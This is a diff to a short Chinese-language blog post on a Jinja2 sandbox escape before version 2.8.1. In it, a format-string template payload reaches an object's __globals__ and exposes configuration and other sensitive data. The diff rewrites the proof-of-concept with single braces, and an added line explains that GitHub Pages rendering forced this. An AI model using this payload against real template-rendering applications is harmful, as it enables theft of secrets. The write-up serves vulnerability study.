@@ -8,6 +8,7 @@ Jinja2在防御SSTI（模板注入漏洞）时引入了沙盒机制，也就是�
 
 但由于format带来的字符串格式化漏洞，导致在Jinja2.8.1以前的沙盒可以被绕过，进而读取到配置文件等敏感信息。
 
+
 poc
 ```python
 from jinja2.sandbox import SandboxedEnvironment
@@ -15,7 +16,9 @@ env = SandboxedEnvironment()
 class User(object):
 	def __init__(self, name):
 		self.name = name
-t = env.from_string('{{ "{0.__class__.__init__.__globals__}".format(user) }}')
+pp='{ "{0.__class__.__init__.__globals__}".format(user) }'
+t = env.from_string(pp)
 t.render(user=User('joe'))
 ```
+pp变量的第一个`{`和最后一个`}`应时2个`{`或2个`}`。github pages有渲染错误，只能改成这样。
 成功读取到当前环境所有变量__globals__
